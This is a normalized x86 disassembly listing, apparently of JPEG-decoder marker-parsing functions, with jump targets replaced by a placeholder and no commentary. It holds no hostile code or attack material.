mov [ ebp - 0x1c ] edx
xor al al
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
xor al al
jmp r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x24 ] eax
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x14 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x1c ] eax
xor al al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0x18
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x17c ]
mov [ ecx ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
mov [ ecx + 0x8 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov [ ecx + 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x64
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x194 ]
xor eax eax
mov al [ edx + 0xd ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0xc9
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x20
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x1c ] 0x0
jbe r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x3a
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0xc4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xb
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24 ] 0x0
jg r-xdata
mov [ ebp - 0xc ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
imul eax eax 0x54
push eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax ]
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
imul ecx ecx 0x3
cmp [ ebp - 0x4 ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x24 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x194 ]
mov [ ecx + 0xd ] 0x1
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov [ edx ] eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] edx
mov al 0x1
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
mov [ ecx ] eax
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x14 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x1c ] eax
xor al al
jmp r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
xor edx edx
test edx edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x14 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
sar eax 0x4
and eax 0xf
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp - 0x8 ]
and edx 0xf
mov eax [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x1c ] eax
xor al al
jmp r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x14 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
add edx 0x18
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x65
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
xor edx edx
test edx edx
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x1c ] eax
xor al al
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x54
mov [ ebp - 0x10 ] edx
sub_41c700
push ebp
mov ebp esp
sub esp 0x70
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ edx ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x194 ]
xor edx edx
mov dl [ ecx + 0xd ]
test edx edx
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x3e
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp - 0x28 ]
sub edx 0x1
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x24 ]
xor ecx ecx
mov cl [ eax ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x20 ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp - 0x28 ]
sub eax 0x1
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x24 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x24 ]
add ecx 0x1
mov [ ebp - 0x24 ] ecx
xor edx edx
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x20 ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
xor al al
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x28 ] edx
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x28 ]
sub eax 0x1
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x24 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
xor ecx ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x20 ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x67
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x18 ] eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
mov ecx [ ebp - 0x10 ]
lea edx [ ecx + ecx + 0x6 ]
cmp [ ebp - 0x4 ] edx
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x28 ] edx
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0xb
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp [ ebp - 0x10 ] 0x1
jl r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x10 ]
jge r-xdata
cmp [ ebp - 0x10 ] 0x4
jle r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x124 ] eax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x28 ]
sub ecx 0x1
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x24 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x24 ]
add ecx 0x1
mov [ ebp - 0x24 ] ecx
xor edx edx
test edx edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x20 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp - 0x28 ]
sub eax 0x1
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x24 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
xor ecx ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x20 ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x16c ] ecx
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x28 ] eax
xor al al
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x28 ] edx
xor al al
jmp r-xdata
mov edx [ ebp - 0x28 ]
sub edx 0x1
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x24 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
xor eax eax
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x20 ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x28 ]
sub edx 0x1
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x24 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
xor eax eax
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x20 ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x170 ] edx
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
xor al al
jmp r-xdata
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
xor al al
jmp r-xdata
mov eax [ ebp - 0x28 ]
sub eax 0x1
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x24 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
xor ecx ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x20 ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
cmp eax [ edx + 0x24 ]
jge r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov edx [ ebp - 0x14 ]
sar edx 0x4
and edx 0xf
mov eax [ ebp + 0x8 ]
mov [ eax + 0x174 ] edx
mov ecx [ ebp - 0x14 ]
and ecx 0xf
mov edx [ ebp + 0x8 ]
mov [ edx + 0x178 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ edx ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x28 ] edx
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x5
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x18 ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
cmp edx [ ecx ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
add ecx 0x18
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16c ]
mov [ edx ] ecx
mov edx [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x170 ]
mov [ edx + 0x4 ] ecx
mov edx [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x174 ]
mov [ edx + 0x8 ] ecx
mov edx [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x178 ]
mov [ edx + 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x69
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
xor ecx ecx
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x7c ] edx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x24 ]
mov [ ecx ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x28 ]
mov [ eax + 0x4 ] ecx
mov al 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
add ecx 0x18
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x18 ]
mov [ edx ] eax
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
mov eax [ edx + 0x18 ]
mov [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x68
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
xor eax eax
test eax eax
jne r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x1c ]
add ecx 0x54
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
mov [ eax + edx * 4 + 0x128 ] ecx
mov edx [ ebp - 0x14 ]
sar edx 0x4
and edx 0xf
mov eax [ ebp - 0x1c ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0x14 ]
and ecx 0xf
mov edx [ ebp - 0x1c ]
mov [ edx + 0x18 ] ecx
sub_41cc50
push ebp
mov ebp esp
sub esp 0x17c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x12c ] ecx
mov edx [ ebp - 0x12c ]
mov eax [ edx ]
mov [ ebp - 0x130 ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x134 ] edx
mov eax [ ebp - 0x134 ]
sub eax 0x1
mov [ ebp - 0x134 ] eax
mov ecx [ ebp - 0x130 ]
xor edx edx
mov dl [ ecx ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
cmp [ ebp - 0x134 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x12c ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x134 ]
sub ecx 0x1
mov [ ebp - 0x134 ] ecx
mov edx [ ebp - 0x130 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x12c ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x12c ]
mov eax [ edx ]
mov [ ebp - 0x130 ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x134 ] edx
xor al al
jmp r-xdata
cmp [ ebp - 0x134 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x2
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x12c ]
mov ecx [ eax ]
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x12c ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x134 ] eax
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x134 ] 0x0
jne r-xdata
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x130 ]
mov [ edx ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ebp - 0x134 ]
mov [ ecx + 0x4 ] edx
mov al 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0xb
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp - 0x134 ]
sub edx 0x1
mov [ ebp - 0x134 ] edx
mov eax [ ebp - 0x130 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x120 ] ecx
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
xor eax eax
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x12c ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x50
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x120 ]
mov [ ecx + 0x18 ] edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x11c ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x12c ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x134 ] ecx
xor al al
jmp r-xdata
cmp [ ebp - 0x11c ] 0x10
jg r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x11
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x134 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0x18
mov [ ebp - 0x138 ] eax
mov ecx [ ebp - 0x17 ]
and ecx 0xff
mov edx [ ebp - 0x138 ]
mov [ edx ] ecx
mov eax [ ebp - 0x16 ]
and eax 0xff
mov ecx [ ebp - 0x138 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x15 ]
and edx 0xff
mov eax [ ebp - 0x138 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp - 0x138 ]
mov [ edx + 0xc ] ecx
mov eax [ ebp - 0x13 ]
and eax 0xff
mov ecx [ ebp - 0x138 ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0x12 ]
and edx 0xff
mov eax [ ebp - 0x138 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0x11 ]
and ecx 0xff
mov edx [ ebp - 0x138 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp - 0x10 ]
and eax 0xff
mov ecx [ ebp - 0x138 ]
mov [ ecx + 0x1c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x56
push 0x2
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
xor ecx ecx
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0x18
mov [ ebp - 0x13c ] eax
mov ecx [ ebp - 0xf ]
and ecx 0xff
mov edx [ ebp - 0x13c ]
mov [ edx ] ecx
mov eax [ ebp - 0xe ]
and eax 0xff
mov ecx [ ebp - 0x13c ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0xd ]
and edx 0xff
mov eax [ ebp - 0x13c ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0xc ]
and ecx 0xff
mov edx [ ebp - 0x13c ]
mov [ edx + 0xc ] ecx
mov eax [ ebp - 0xb ]
and eax 0xff
mov ecx [ ebp - 0x13c ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0xa ]
and edx 0xff
mov eax [ ebp - 0x13c ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0x9 ]
and ecx 0xff
mov edx [ ebp - 0x13c ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp - 0x8 ]
and eax 0xff
mov ecx [ ebp - 0x13c ]
mov [ ecx + 0x1c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x56
push 0x2
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
xor ecx ecx
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x134 ]
sub ecx 0x1
mov [ ebp - 0x134 ] ecx
mov edx [ ebp - 0x11c ]
mov eax [ ebp - 0x130 ]
mov cl [ eax ]
mov [ ebp + edx - 0x18 ] cl
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x12c ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0x124 ] 0x100
jg r-xdata
mov ecx [ ebp - 0x11c ]
xor edx edx
mov dl [ ebp + ecx - 0x18 ]
mov eax [ ebp - 0x124 ]
add eax edx
mov [ ebp - 0x124 ] eax
jmp r-xdata
mov eax [ ebp - 0x12c ]
mov ecx [ eax ]
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x12c ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x134 ] eax
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x8
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp - 0x124 ]
cmp edx [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebp - 0x11c ]
add eax 0x1
mov [ ebp - 0x11c ] eax
mov eax [ ebp - 0x11c ]
cmp eax [ ebp - 0x124 ]
jge r-xdata
mov [ ebp - 0x11c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
